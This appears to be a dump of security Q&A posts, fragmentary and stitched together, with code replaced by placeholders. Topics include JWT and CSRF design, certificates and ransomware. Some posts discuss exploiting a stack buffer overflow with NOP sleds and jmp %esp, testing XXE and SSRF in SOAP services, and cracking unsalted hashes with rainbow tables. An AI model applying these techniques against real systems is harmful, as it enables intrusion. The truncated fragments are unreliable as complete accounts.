acquire your secret key. Then, he has to somehow - spending insane amount of manhour and effort - rebuild all of the data into meaningful data.

","We've recently had one of our webapps pentested. All went well, except for a CSRF vulnerability, and it is this finding I have a bone to pick with. Some background: we're using ASP.NET MVC and, among other things, we do use the  functionality built into it. The way it works is strictly in accordance with what : by including so-called ""synchronizer tokens"", one in a HTTP cookie, and another in a hidden input named {code-blk} field is what bothers me the most: to me, it is akin to claiming that an attacker has transferred gazillion dollars from my bank account because I voluntarily gave him my iPhone to fiddle with, and he saw the one-time password that my bank sent in an SMS. I imagine that the only way this attack could potentially work is if we were not using HTTPS, were vulnerable to XSS, were using non-HTTP-only cookies and were negligent with a Same Origin Policy. None of which is true, since none of these vulnerabilities were reported by either pentesters or Acunetix.

","Apologies if my questions seem a little basic or not meant for a technical forum (Unsure where to post a career related question). I am looking into doing courses and certifications with the aim of becoming certified for penetration testing with a possible specialisation into Wireless and Web Application security. With this in mind I was looking at the www.giac.org certification roadmap and a little unsure as to which course(s) to plan for. I'll probably self-study and then write the exam for the introductory courses with a view of taking live classes for the more advanced courses. What I am unsure on is which courses to write the exam for in which order?

","I will be using JWT for authentication for my REST API. I am using third party cloud services and database write are very expensive so I am trying to avoid writing to the database as much as I can. Due to this I want to avoid using a refresh token because that way I would have to frequently update the database (writing is almost 10x more expensive than reading). My general plan for authentication flow is the following: 1)User registers (assuming email authentication is complete and all) and the following database table gets populated as such: {code-blk} of 1. This means when they were being verified the token would say 1, but the database would show 2, they would not match. 12) The valid user would sign in again and get the proper token with the increment showing 2 and be able to do whatever they need to do. With this method the only time I would need a database write is when an account is hacked, opposed to updating the database every time the refresh token expires. Besides the inherited security downfalls of JWT, is there any obvious holes in this strategy (I understand nothing is ever really secure)? Cheer",52,248,1,True

","I'm trying to apply the principle that  in a system with many services through which this toxic asset must flow. The system can be abstracted to 3 actors: clients, intermediaries, and (data) sources. Clients will eventually wish to view some sensitive data (think credit card numbers or PI info) that is housed in a secure data source. Intermediaries are the services in between the client and the source, and so must come into contact with this sensitive data, which is the whole problem. For the purposes of this scheme, I want to assume that the client and the source are secure (not vulnerable to XSS, injection, etc). My goal is to design a scheme that will mitigate the threat of exposing sensitive data from intermediary services. The method of exposure could be anything, but may include disgruntled employees snooping for credit card numbers, or the service accidentally logging them to places that non-privileged admins can access. There is an additional requirement that the intermediary can restructure the data (otherwise there would be no point to having an intermediary in the middle at all). For example, imagine the following payload coming from a source: {code-blk} field wherever it likes, and it will never have access to the original value since it doesn't have access to the user's private key. Of course, the client will then have to be smart enough to decrypt the field using its private key once the intermediary puts it in an arbitrary place in their own response. My second question is thus, does this seem like a sane scheme to negate the ""infectious"" quality of toxic data? Of course, I don't see any points of vulnerability above and beyond standard attacks against whatever encryption and decryption algorithms we choose to use, but that's kind of the whole reason one shouldn't roll their own cryptosystem :) Thanks for putting up with the long read if you've made it this far!",155,433,1,True

Follow-up investigation suggests the initial red flags were false-positives after all. However, I found actual red flags during the same follow-up. Actual Red Flags: They are five {code-blk} entries and deleting corresponding files. How safe is Safe-Mode in these scenarios? I heard it can be blocked, but how easy/hard is that? And if it is accessible, how much does it protect? What if networking/command was also enabled? How useful is monitoring processes via Task Manager? It helped me several times in the past, can't tell if it's just luck or for real though. How easy/hard it is to find weird names or high CPU usage there?

So assuming we have a scenario like this: {code-blk} where Root A and Root B both signed intermediate and intermediate signed my Cert. The Server is configured to deliver intermediate and my Cert as the certificate path and will hint that Root A should be the Trust Anchor.

Will a client accept my Cert if it has only intermediate as a Trust Anchor? Will a client accept my Cert if it has only a self-signed Version of intermediate (but same priv/pub Key and Subject) as Trust Anchor?

","Is there a way with DMARC/SPF/DKIM to forward all emails that fail DMARC to an email address I specify? Ie, if someone tries to spoof an email saying it's from me, and it fails, I'd like that email to be sent to an email address I specify rather than who they intended it for.

","I'm learning about stack buffer overflow and I'd appreciate help. I'm exploiting simple web server containing this log function. Argument s1 is the input that I supply via HTTP. Server is running on x86 linux with stack address randomization. {code-blk} The exploit is working only when I include 9 and more nops between the overwritten EIP and start of the shellcode, otherwise it seg faults. My question is why? Why is the nops sled necessary in this case? My hypothesis is that the shellcode is decoding itself and overwriting some memory before it; when I include nops, the memory is writable, when I don't, the memory is not-writable (because it is before ESP?) and therefore it seg faults. My second question is whether this exploit would work with ""call %esp"" instead of ""jmp %esp"". According to what I found on the internet it would work, but I don't understand why. Imagine the same exploit as wrtitten above but overwriting the EIP with address containing ""call %esp"". This is my understanding what would follow: log function returns. EIP is popped of the stack and processor jmp on it. ESP points under (bigger address) just-popped EIP (NOPs are there). processor finds ""call %esp"" instruction. EIP is pushed to stack. ESP now points at the just-pushed EIP. jmp %esp is executed. Jumping on the top of the stack where is the EIP that was just pushed. What now? Next instruction isn't a NOP but some random first byte of the EIP.",182,399,1,True

But let's suppose, the attacker has been sniffing and had already captured the SC when the server sent it to the client.

I was considering a setup like this: {code-blk} Is the setup destined to cause endless headaches setting up or is it quite straight forward? The BT Smart Hub actually has an extra WAN port too, I wasn't certain if it was even a possibility to go from this WAN port to the Internet (WAN?) port on the D7000? Are there any extra benefits to this if it is possible? More secure? Any harder to setup?

Is there any risk of direct access to the devices on the 2nd router via the main router or will the firewall in the 2nd router block this?

The idea behind this question is to minimise the possible amount of patching that would have to be implemented to protect the underlying layers. How far must I patch?",139,195,1,True

","A month or so ago I was in the middle of one of my ""Distributed Applications"" classes and the professor was explaining us how to """"""properly"""""" authenticate users in a server. To demonstrate how to prevent users from accessing all files under a given directory (i.e. with name ""private""), the professor showed us some JSP code that was something like the following pseudocode: {code-blk} then URI wouldn't contain the literal string ""/private/"" so the user would be granted access. Yesterday I remembered that class, so as I was curious about it, I indeed found out that not only all my previous web projects in Uni actually had this vulnerability, but even some websites of serious companies also have this issue. You can access to a lot of pages where you should not be able to (basically user profile pages when you haven't logged in), just by percent encoding some character in the URL. So, as I've realized that there are a lot of people not caring too much about this issue I'm a bit confused. Isn't it a big flaw? What could be some attacks that could be done taking advantage of this issue? I'd just like to know, from a theoretical point of view if possible, how bad could get this issue for a site that does not manage url-encoding properly. P.S: I know that a plausible solution could be to also check if requested URL is percent-encoded and denying access to it. Or even if we'd like to go further and implement a more secure solution we could use a Key Distributed Center such as Kerberos. However I don't understand why you can find serious websites with this flaw and it doesn't seem soo much of a big deal to them.",53,408,1,True

","{code-blk} Docs in MariaDB KB . MariaDB KB doesn't write about how secure those functions are. Do you recommend a cloud native app (12 factor) to offload Encryption to the database (in my case MariaDB)? Can my example code be improved to be more secure (but only with MariaDB functions)? I found a (maybe)  of a product vendor MyDiamo (they wish to sell): Why MySQL Internal Encryption Functions are not Sufficient 1. MySQL Internal Encryption Algorithms are not Safe MySQL provides many algorithms such as AES, DES, SHA-1 and MD5 algorithms. Among these algorithms, MD5 and SHA-1 are proven to be not safe as they have been cracked. Also, for AES algorithms, the current MySQL 5.6 version generally available provides only the ECB operation mode which is also proven to be unsafe. 2. MySQL Internal Encryption Functions does not Provide Key Management When encrypting data, not only is the encryption itself important, but also managing key is important. The importance of the key cannot be stressed strongly enough when encryption matters. Most encryption solutions however do not pay much attention to the key. When using MySQL internal encryption functions, the key is exposed to the source, thus no proper key management exists.",279,291,2,True

","The design of the application is simple: User Input > Serialize as JSON > Client-side Encrypt > Upload to server The object being stored is structured like this: {code-blk} or the field names. The user is allowed to create as many objects as they want, and each object can be large (e.g. 10MB). The problem then is that a user could store arbitrary data in the encrypted blob, and the server would have no way of verifying if the uploaded data is a valid object or not. They could (ab)use the server as a cloud storage alternative to Dropbox, S3, etc., instead of for its intended purpose. Ideas for mitigation that I have so far: Network rate limiting per user/IP address. Rate limiting number of objects per user. Requiring proof of work for each object. Require CAPTCHA input every X object. Ideas that might work in similar cases but not this one: ""Proof of space"" will not work in this case because the client is not expected to keep a copy of the objects they upload. Requiring payment for each object or unit of storage will also not work in this case because the application is free. The mitigations I listed definitely help but do not eliminate the possibility of abuse, and each one has detrimental effects for legitimate users. Is there a way for the client to prove, or the server to verify, that the encrypted blob contains a valid object? Or other cryptographic, network-level, or application-level mitigations you can think of?",60,340,2,True

From there I was able to determine the origin and destination of the attempts of all these RDP attempts. I ran procmon on the origin machine and matched the event from the netlogon file (on the PDC) to the correlating event on the destination machine. I took the source port used which was logged in the event viewer (security) on the destination machine and matched filtered procmon using that port num. That gave me the process/PID of the culprit which was a network management service used by ""Advanced Monitoring Agent""/RMM which is an MSP software by solarwinds (I looked up the PID in Task Manager). So for some reason the MSP agent was trying to RDP using the guest account. I have went ahead and uninstalled it from all the local users machines and servers.

","I have been thinking to try out JWT as an alternative to the old session based authentication for performance reasons (i.e. no additional SQL lookup for session id in database just to get the user id for each and every HTTP request) and usability reasons (JWT is gonna be used in HTTP headers instead of cookies so that my app can be used as RESTFUL API and accessed by non-browser clients like mobile apps, also adding JWT in HTTP headers eliminates the danger of CSRF). Since the payload is signed with a secure HMAC like SHA256, it's nearly impossible to forge the payload. Additionally, the user id itslef isn't really a secret and is used publicly by the app. I am thinking of using a payload that is something like this: {code-blk} is a unix timestamp at which the JWT was created and this can be used to expire the JWT message and also harden the security by randomizing the hash for the same id. My question is, assuming that I am going to apply strict HTTPS connection for my app in production, is using this unencrypted payload secure enough to verify user's identity and initiate unsafe methods like POST methods (e.g. follow a user, unfollow a user, etc...) that's as secure as the session based authentication?

","Many API's (services) today use OAuth, HTTP Basic Authentication or API keys to authenticate their users. My goal is to find a simplistic secure way to authenticate users in a client-side webapplication in a  way for one service. Authentication methods Here's my view on some of the authentication methods: seems like a great solution, but it looks very complicated to setup and seems overkill for just one service. According to  ""HTTP Basic authentication is not secure and should not be used in applications"". Using plain API keys in a client-side webapplication does not seem like an improvement in comparison to HTTP Basic authentication. Using encrypted tokens My alternative idea is to use encrypted tokens which can be verified by the service. The token's plaintext will contain the username, password & the expiration date of the token. The plaintext will be encrypted using a secret key which is only known by the server. The plaintext will be encrypted on the server using AES in GCM mode, so that the integrity can't be manipulated. The user needs to login with his/her username and password to receive a token. This token is send on every request and can be verified on the server. To illustrate: {code-blk} Verification Verification can be done by: Decrypt the token using the secret key. Verify username and password. Check if the token is expired. Pro's Possible pro's of this approach: Tokens can be stored in localStorage to mitigate against CSRF attacks and users are able to logout by clearing the localStorage. Plaintext login information is not send on every request. Tokens can expire. Cons Possible cons of this approach: More load on the server by decrypting every request. A token is bound to a specific server. What do you think is a good solution? Do you know other good alternatives?",78,416,3,True

","Is there a way to get OWASP ZAP to send a client certificate? I have an HTTPS website that receives client certificates for authentication. I have the certificates installed in the browser. Previously, when I went to the website (in Firefox), I would be prompted to select one of the installed certificates. I would then be authenticated with the website as the user associated with the certificate. However after setting up the browser to use a proxy, I am no longer prompted to select a certificate and then the browser just displays this message: {code-blk} It looks like I need to get OWASP ZAP to send the certificate in place of the browser or, somehow, get the browser to force ZAP to forward the certificate. Is there some way for me to do this? Is this something that ZAP supports? Edit: My setup works like this: There are three components. Firefox, OWASP ZAP and a Selenium project. Previous, it was just Selenium and Firefox. The application I am testing has multiple users with different roles. The Selenium test cases involve logging in as one user, performing a task as that user (which generates work for another user), logging in as the next user, performing work as that user etc. Each user has its own certificate to log in. Previously, I created multiple Firefox profiles (one for each user) and added a single certificate for each profile. When I accessed the site with one of these profiles, the browser would default to the single certificate. Selenium could then switch between users by closing the old browser and opening a new one with the correct profile. Right now, I use ZAP by opening the appropriate browser profile, setting the proxy to localhost:8080, starting the ZAP GUI, and then running the Selenium test which uses the aforementioned profile. Latter I manually set the contexts, run the spider and switch to Attack Mode.

","I have a REST API that allows authenticated users to read data about their own account and make changes to their accounts. For authentication I use JWTs stored as httpOnly cookies. To protect against CSRF attacks, the REST API also supplies the client with what Angular calls an ""XSRF token"". Angular's method of CSRF protection is to take the XSRF token your API creates and re-submit it back to the API with each request in an ""X-XSRF-Token"" header. It's up to your API to determine whether to allow the request or not. A script running on a hostile website would not have access to the XSRF token and so would be unable to submit it along with any CSRF requests. When I went to implement my front-end requests in Angular using HttpClient, I noticed that the HttpXsrfInterceptor doesn't send the X-XSRF-Token header with GET and HEAD requests. From the opinions I've read online, CSRF protection is not needed for GET requests because they don't (or they shouldn't) modify any data. The most a CSRF attack could do with a GET request is have the REST API send sensitive data to the user's web browser. The hostile website wouldn't be able to see that data. Example 1: CSRF GET If a hostile website tries to issue a CSRF GET request like this: {code-blk} Some CORS policies would stop this, but other CORS policies would still let it happen.

19942,"HTTPS Client Authentication

HTTPS Client Authentication requires the client to possess a Public Key 
Certificate (PKC). 
If you specify client authentication, the web server will authenticate the 
client using the client’s public key certificate.
HTTPS Client Authentication is a more secure method of authentication than 
either basic or form-based authentication. It uses HTTP over SSL (HTTPS), 
in which the server authenticates the client using the client’s Public Key 
Certificate (PKC). Secure Sockets Layer (SSL) technology provides data encryption,
server authentication, message integrity, and optional client authentication for a 
TCP/IP connection. You can think of a public key certificate as the digital 
equivalent of a passport. It is issued by a trusted organization, which 
is called a certificate authority (CA), and provides identification for 
the bearer.
","Try to expose protected REST API without exposing credentials in the Client (JS Code). All solutions that come to my mind, can be reversed and the Attacker can reconstruct them. Are there any proven solutions? Best practices? Ideas, I came up for example: Obfuscating credentials Hashing client side set of elements and comparing server side to make sure the Client is untouched (not used by the Attacker) can be reversed. Unfortunately, HTTPS authentication does not come into play, since the website accessing the REST API (Client, JS Code) should be open to the public. I cannot request each Client (Website visitor) to request a PKC (Public Key Certificate) {code-blk} I want to prevent that people will obtain credentials and scrape/perform many request to REST API. I guess, our only solution is than IP based throttling? To punish bad Clients. Thanks in advance! Update 1: After Discussions with @ThoriumBR, came up with this solution. Not optimal but should be better than nothing. Design: Client Website <-> New API (Proxy) <-> Old API Flow: Wrap old API (private) against new API (public, in diagram above Proxy) 1) Client Website makes Request to Proxy 2) Proxy Sends CAPCHA back 3) Client Website complete CAPCHA 4) Proxy creates JWT (assign capcha intrval in JWT for example as 10 (capcha_int:10), assign deviceid: fingerprint (to know the users from the same IP)) sends it back to Client Website. Proxy checks also for abuse, if deviceid is misbehaving, it will be blocked. 5) Website Send request to Proxy with JWT 6) Proxy check JWT, if capcha interval (capcha_int) is equal 10 send CAPCHA, resets it, if it misbehaves, if not, sends request to old API 7) old Api sends reponse via Proxy to Client Website IPs will be IP based Throttled for abuse.

","I've recently asked this question on SO. As the question was not answered yet, I've come up with an approach. But I wanted to check if there is not any security flaw in this solution. Question I had written a session management plugin in node.js for Muneem web framework. Here is pseudo code to create a new session; {code-blk} As you can notice, I'm renewing a session when it is valid and satisfy certain conditions by deleting the previous session. But I don't update it in the store immediately. Instead, I update the session information in the store and set the cookies when the response is being sent to the client. Now suppose a condition, when the server receives multiple requests with the same session-id which is eligible to renew. I renew the session on the first request. Scenarios Session is not updated in store. So I'll renew the previous session with another new session id. A user will have multiples session-id in this case. Session is updated in the store. Now, the previous session will not be available in the store. I'll have to ask the user to login again if it is authorized session. Or I'll create another session. Solution To solve this race condition, I was thinking to create a DB table where the records can self-expired after a fix duration, say transition-time. When a session should be renewed, we do an entry in expired-session table with the old and new session id. Rest of the operations are the same as per above pseudo code. Now, if the next request with expired session-id reaches to the server within transition time, say 10 secs, then we'll fetch new session-id and continue the session. is the full code, in case we need.",229,407,1,True

A new hash will be computed for every message. Method 2: I thought method 1 will be not secure enough. There is still a chance another player might guess the hash.

I'm using a ""language"" for mobile programming called  ""unfortunately"" that means that the program will be open source, so I think it's impossible to make it completely secure because anyone can see & modify their local version of the code (but they need both the code & someone else's save-file to compromise the security, and realistically then it's already game over for any security program).

My Question: Why does bcrypt recognize it as a password match when I provide it with another generated hash from the website ? What is bcrypt.checkpw() actually comparing? If I were to check if the user's input matches the salt+hash on the server, how should I do it? bcrypt provides a different salt+hash every time the function runs, and apparently salt1+hash1 matches salt2+hash2 when generated from the same string.

20457,"Requirements for the secure LDAP certificate
Acquire a valid certificate per the following guidelines, before you enable secure LDAP. You encounter failures if you try to enable secure LDAP for your managed domain with an invalid/incorrect certificate.

    Trusted issuer - The certificate must be issued by an authority trusted by computers connecting to the managed domain using secure LDAP. This authority may be a public certification authority (CA) or an Enterprise CA trusted by these computers.
    Lifetime - The certificate must be valid for at least the next 3-6 months. Secure LDAP access to your managed domain is disrupted when the certificate expires.
    Subject name - The subject name on the certificate must be your managed domain. For instance, if your domain is named 'contoso100.com', the certificate's subject name must be 'contoso100.com'. Set the DNS name (subject alternate name) to a wildcard name for your managed domain.
    Key usage - The certificate must be configured for the following uses - Digital signatures and key encipherment.
    Certificate purpose - The certificate must be valid for SSL server authentication.

I can create an RFC 5280 compliant certificate, but when I do it with the extensions required by ADDS LDAP, the printer does not validate it as RFC 5280 compliant.

So community A can allow certain users to moderate it, change settings, invite users, read logs etc for their own sub-server, but not others. My current system has a global user, this user has permissions structured similar to this: {code-blk} A single user has access based on 'resources', and when they attempt to modify, read or do anything through my API or Socket, i check if they have access to the resource they're modifying. This is pretty easy for me to manage permissions through the API as i intercept the request, grab the resource and see if they're permitted to perform the action they're trying to do, such as read a log or invite a user and then either reject the API call before it ever reaches the controller. The main issue I'm now having is with maintaining multiple means of access, I now have the REST API and a WebSocket which can access the same kinds of data depending on where they're accessing the guild from. So now the permission system has become significantly more complicated and isnt as easy as intercepting a request from the REST API and blocking it, i now have two permission checking systems which I feel is wrong and breaks the DRY Principle. I'd like to learn if there are any industry standards for multiple means of accessing data. Should I build a resource manager which always needs credentials and the target resource, and then have a system user for internal access or is there an easier standard for tight nit control over who can do what based on the permissions they have for a specific resource.

However they come from a variety of accounts and computers, and are just simple auth attempts against the Domain Controller. I am confident they are not malicious. What is the best way to track down a failed authentication event on a Domain Controller down to what application in the environment causes the authentication? They are similar to generic events found through Event Viewer on the Domain Controller, and I can see the hostname and username of where the auth came from.

Sorry the original condition of my document is badly scanned before it was handed to me. I have several discussions with my friends, and they suggested this solution for (a). Fill the first 50 characters of B with non-null characters and the 51st element with a null terminator. The length of the string represented will be 50, as shown from strlen(B), this causes the branch with strncpy(A,B,C) to occur, which will copy the first 50 characters of B into A. Later on when the loop is called, number of loops equal to the length of B, there will be a Buffer Overread as it reads outside the bounds of the array A. As C is an unsigned char with bounds 0 to 255 while strlen returns unsigned int with bounds 0 to 2^32 – 1, the extent of Buffer Overread will differ. (b) will require me to assume this is the case in (a), and will require me to answer it like this: When printf() is called, it will result in an infinite loop as with the same configuration, the '\0’ cannot be found in the array.

Part III (WHAT HE DID BUT WAS NOT GOOD ENOUGH) After a deep looking at his server I find out that: There was an AV but that AV had no Anti Ransomware module. The server OS was Windows server 2016 and was up to date and patched and the windows Defender was enabled. There was some old backup from DB and source-codes. Part IV (WHAT HE DOES TO DO) The data is unique and valuable and he had to do something to save his ***. Pay the Ransome! But as Norton mentioned in the first tip in Do not pay the ransom. It only encourages and funds these attackers. Even if the ransom is paid, there is no guarantee that you will be able to regain access to your files. Remove it! But How? Files are encrypted and the backups are not worth to restore. I could not find a practical solution to ""how to recover ransomware encrypted files"". Forget everything and start from scratch!

Request with valid AccessToken => (Response with the requested resource) Request with expired AccessToken => (Response with the requested resource + New AccessToken) The problem here is that the Refresh Token (random unique string) is being sent with every request over the wire in plain text, and I can't want to force my clients to use HTTPS only. but then again, even in the ""conventional model"" the Refresh Token will be sent every X period of time, and a packet sniffer will be able to steal it easily if the connection wasn't over HTTPS Am I missing something here? Is my model flawed? Or is the conventional OAuth model must be strictly used over HTTPS? Is forcing HTTPS is my last resort?",54,410,2,True

Many articles just talk about RSA and seem to recommend 2048 or 3072 though mentioning that 2048 is today probably still the best choice (  ) I found for example one Article (  )  but it seems to talk mostly about key encryption as @dave_thompson_085 pointed out on SO stating in the section ""Asymmetric (""Public Key"") Encryption"" {code-blk} However they don't mention the impact on server CPU usage compared to RSA 2048/3072/4048. I also didn't find many other articles suggesting to switch to Elliptic curve algorithms. Another article )  _ tries to promote ECC instead of RSA, but comments on the article state, that ECC is less safe than RSA if quantum computers kick in. And the article cites nowhere numbers for what  performance improvement to expect when using ECC. mentions potentially legal issues and fear of being sued. Though CPU usage is not a major issue Id still like to get some idea as I'd like to use the same CA and cert store also on devices like raspberries. So what is today the best choice for certificate key algorithms and key sizes for server certs (old internet explorer not required but PCs, tablets, mobile phones being used today should be able to connect to the server and what's the best choice for client certs (will not be used on mobile devices)?

","The conundrum My wife’s laptop has been running openSUSE Leap 15.0 for several years, and she has once or twice been flummoxed by this prompt at the very beginning of the boot sequence, most recently this morning: {code-blk}. I should like to know why this happens, and particularly if it could be a sign of a security problem. The system The system (openSUSE Leap 15.0) has been in almost daily use for several years with frequent reboots without the above prompt; it has not been changed recently apart from installing updates, none of which I believe were installed since the previous boot. (I ought to get round to updating to a new version of Suse, but that is another matter!) Sources consulted I searched for the above prompt and found nothing that helped me much. I looked at: , a 2012 description of the boot process. This includes the following, which reassures me somewhat by describing a built-in key and possibility to override it, but does not explain the sporadic appearance of the prompt: The shim then goes on to verify that the GRUB2 bootloader it wants to load is trusted. It will not use the SUSE KEK1 nor the Microsoft cert for this. In a default situation the shim will use an independent SUSE certificate embedded in its body. In addition, the shim will allow to “Enroll” additional keys, overriding the default SUSE key. Let’s call them “Machine Owner Keys” or MOKs for short. 1 Key Exchange Key “The Platform Key (PK) allows almost everything. The Key Exchange Key (KEK) allows all a PK can except changing the PK.” in the Unix & Linux community. That includes the prompt but seems to have little bearing on our problem, being about subsequent problems getting an image to boot. , at Forbes.com describing security problems in GRUB. This sounds scary at first, but I do not think it is relevant. After all, malware would hardly want to ask the user’s permission!",27,466,1,True

","I have a Docker Compose setup that starts up Nexus, Jenkins and Nginx containers. All calls to Jenkins and Nexus must pass through Nginx.

As far as I know, in the vast majority of cases an IV or nonce should be unique for each message, but doesn't need to be secret.  It looks like an IV is being encrypted or just stretched here.  If you have the ability to generate an appropriate salt value why not just generate an IV and include that in the header of your message? Is the assumption that you're working in an environment without access to a high quality PRNG (maybe because you're operating cross platform with just the standard libraries and OpenSSL) and need to stretch your RNG as well as your password? Or, in the case of a null salt, is it just assumed that most messages will use unique passwords so no effort to have unique IVs needs to be taken?

To elaborate my proposal: {code-blk} Dealing with a client logging into a webservice, via HTTPS. The client (browser) navigates to the login webpage. The server time is embedded in a JavaScript variable of the webpage. The client JS then calls a locally running python app that is a webservice, and passes it the server time.

From CryptoJS's documentation: {code-blk} We would prompt the user to provide a decryption key (in the example above 'secret key 123'), which we'd put some requirements on such as minimum character length, including a number, special character etc. From a security perspective, do you see anything wrong with this setup, considering the use-case? Some previous people have suggested looking into HashiCorp's Vault, which I've already done and got it working as a proof of concept, but the price is too high for this use-case (estimated the cost to be ~$150 per company, per month on their standard plan for a Managed HashiCorp Cloud Vault, and we don't want to self-host our own vault server).",122,253,1,True

","Imagine an API where all CRUD operations are done through the same POST HTTP Request but with different ""action"" values from request body. {code-blk} This looks bad from a design perspective, and might complicate things from a documentation/exposure perspective (handling unnecessary parameters for Read and Delete operations which only require an identifier). Concerning security, I can see potential for possible Mass Assignment issues (E.g. Read only parameters initiated by CREATE being exposed through UPDATE), or Denial of Service (E.g. Excessive READ requests blocking other requests). But I could not find a proper reference to point to that this is bad from a security perspective rather than a design/implementation perspective. For the latter also, the only reference I could find was from  which only refers to RESTFul API development. Whether any guidelines recommend multiple endpoints  for CRUD operations in SOAP API design is unclear. So, Can I document this as a security issue? Is this only bad practice for REST APIs since they have a simplified structure? Does it affect SOAP API implementations as well? Are there any references I could point to from either security or a design best practice  point of view?

","There's a web application on a server which I have full access to which accepts POST requests on a REST endpoint. The request payload is expected to be an XML document. For request routing and load balancing the server makes use of HAProxy, which also takes care of the TLS settings and has the certificate chain and private key in its setup. Recently some posts have been failing. The response has HTTP status code 200 but its payload is an HTML document rather than the expected XML that the service ought to return. It takes this form: {code-blk}). I see no logging for the call on either the web service or even in the HAproxy logs, while the logging is set up so that if the POST made it to the server we'd expect to see at least something in HAproxy. If the POST is replicated with curl on the server itself, bypassing HAproxy and external networks, it succeeds. Trying the call with Postman and the ""problematic"" XML, I can see that the certificate for the TLS handshake is the one set up in HAproxy, so no replacement from a MITM node. The first thing I'm wondering, of course, is why on earth a POST would get blocked because of some perfectly fine entity references in it. It's not an XML bomb, the XML is well-formed and I don't see an issue with the HTTPS POST itself. Looking online for that particular HTML response it seems like a firewall is the most likely culprit. But that raises a second question. How could some node along the network block the POST based on its contents if it's performed over HTTPS? The payload ought to be encrypted. And the TLS connection is established between the client and HAproxy on the server. EDIT: We contacted the hosting provider who confirmed there was an issue with RPaaS.

","How does network segmentation affect network packet sniffing, man-in-the-middle attacks and interconnectivity of devices? I am mainly interested in understanding the possibilities of network malware or a ""packet sniffing"" hacker. Let's have a simple network and the two questions: Question 1 device isolation: Devices are completely isolated from another when they're ""behind"" a router? (assuming that the router has at least a simple firewall blocking incoming connections originated from WAN + no port forwarding) E.g. devices connected to ""Router1"" resp. ""Router2"" are completely isolated from the devices connected to the ""Router2"" resp. ""Router1"" and also from the Router0 itself. Devices connected to ""Router3"" are completely isolated from devices connected to Router1 and Router2, but they can connect to the devices in LAN2 due to ""bridged"" ports on Router2 + to the devices in LAN0 due to ""bridged"" ports on Router0. Right? Question 2 eavesdropping and MITM: If an attacker wants to listen or man-in-the-middle the traffic (lets, for now, ignore any encryption - https, VPN services etc.), the attacker's device must be connected directly to a node, where the specific traffic flows through, right? Thus an attacker from LAN0 can eavesdrop or influence traffic from any device from LAN1, LAN2 and LAN3 because their traffic flows through the same node he is connected to (bridge on Router0 in this case)? But an attacker from e.g. LAN1 cannot eavesdrop or influence traffic from other LANs (LAN0 LAN2, LAN3) because he is connected to a different node (and I assume he is not able to listen or MITM the traffic on a different node [Router0] if 1. he isn't directly connected to the node or 2. he doesn't tamper with the device itself). Am I correct? {code-blk}",260,480,1,True

Original question: I'm new to networking and have been reading into how OpenVPN constructs its packets and a bit more of the technical details of how tls-auth is implemented. From what I have read, all the packets for the TLS handshake are protected with a HMAC signature, for which the key used to produce this signature is derived from the static key given in a client config. There are a few things that are confusing me though, so I just have a few questions: At first, I believed only the packets used for authenticating with TLS (hence the option name) are given this HMAC signature, however on  it states: {code-blk} Or would it be inside the appended payload? Update: Okay so now I know that it is all the control channel packets that use this additional HMAC. I've also been able to check the packet structure properly, and with tls-auth there seems to be an extra HMAC, packet ID, and 'net time' appended after the session ID. I've discovered that the key derived for HMAC production from the static key is 4 lines down when no key direction is specified, with the length of the key being respective of the auth type (eg: 160 bits worth of chars for SHA1) from . The only thing left on my mind is what parts of the packet count as the ""encapsulation header"" from which the HMAC is calculated.",198,383,1,True

","I am trying to test XXE and SSRF in SOAP webservice. Let say that my request looks like this: {code-blk} The problem is that this web service requires WS-Security signature, and in SoapUI the library which signs my request tries to resolve entities instead of sending unresolved ones to the server, so there is no way to test this vulnerability. Moreover, the computer I use for testing has no Internet access, so when I check for SSRF this library tries to connect and gets a connection timeout, and returns an exception. Because this library ends execution with an exception the request is sent without WS-Security signature, so the server just rejects the request. The same problem without a solution I found here: I also tried to use JMeter, which has extention for WS-Security but with exactly the same result. Example of connection error because of an attempt to resolve entity (SSRF attack). Do you know any tools that can be used to test XXE in SOAP web service, where WS-Security is required? Is it a correct behavior of libraries to sign requests with WS-Security to try to resolve external entities or it is just a vulnerability/bug in these libraries? Maybe WS-Security shouldn't sign XML with entities declaration? I can't find anything about this on the Internet and I have no idea how to make this test.

","The main pursuit of this post is to find a way to view the HTTP(S) Headers that are outgoing from my open source proxy server, Tinyproxy. I would like to accomplish this with PHP if possible, but will use any approach that works. Very briefly, after a year of consternation with Express VPN and various sites including banks and online retail, refusing my connection when using Express VPN. I found various ""believable"" explanations of why a site ""knows"" a VPN is being used, including numerous posts here on Stackexchange. Principle amongst these reasons is the existence of lists of IP addresses for major VPN provider servers. I am running Tinyproxy on a Debian 10 VPS. It was easy to install and configure. However there were various sites that refused connection thru Tinyproxy. This included Georgia State Univ. (GSU) Hyperphysics site, Vitacost.com (vitamin and groceries) and Digikey.com (electronics parts). I discovered in the Tinyproxy conf  a ""via"" setting and I turned it off. Now GSU lets me in but I am still blocked by various other sites.

","Yes I can. IPv4, due to the size of the address pool, has long had a technique called Network Address Translation. In a simplistic view, let's assume you are allocated the (invalid) IP address for your router {code-blk} There isn't really enough space in these boxes to write out the full addresses, but in the IPv6 model, the router performs its routing function (it gets packets to the computers on the LAN) but crucially here it routes both from and to the internet, rather than routing / NATing outwards. The effect of this is that the default case for IPv4, namely that home computers aren't directly accessible by nature of the fact they have no IP address unless the router knows about the connection goes away. The computer becomes addressable from the internet, much like a server. Clearly, such connections can still be firewalled, with firewalls denying all incoming (non-client-initiated) connections, however, you've lost needing to explicitly configure your router to route internet packets to you. If the firewall doesn't filter the incoming packet, the client better be able to cope with it. There is, therefore, a slightly increased security risk to home users using IPv6. I expect (hope?) most home routers will come configured with this firewall setting. As such, while the risk is slightly increased, it is still probably dwarfed by the threat from browser-based exploits (the ""outbound stuff"").",220,337,1,True

","is a good technique (though a 1000 doesn't buy you much when simple hashes - md5/sha1 can be calculated at a rate of ~ 1 billion per second per gpu).

It sees something in the authentication section of your web server code that looks like: {code-blk} The attackers say aha! the passwords in the db are hashed 1000 times and unsalted.  They then generate hashes at a rate of a billion per second (so can check a million passwords in a second) with their modern gpu.  So in about 1 day of gpu computational time, they have gotten hashes for 86.4 billion passwords (36 bits of entropy) and constructed a rainbow table on their terabyte hard disk. They then look up all the hashes in the rainbow table and find many matches; now with the plaintext password and the user name, they try breaking into other services of those users where they may have reused passwords.  If the passwords were uniquely salted, they would have to generate a new rainbow table for each password making the brute-force attack much less successful (e.g., one day or so of GPU time to brute force each simple password).",249,422,1,True

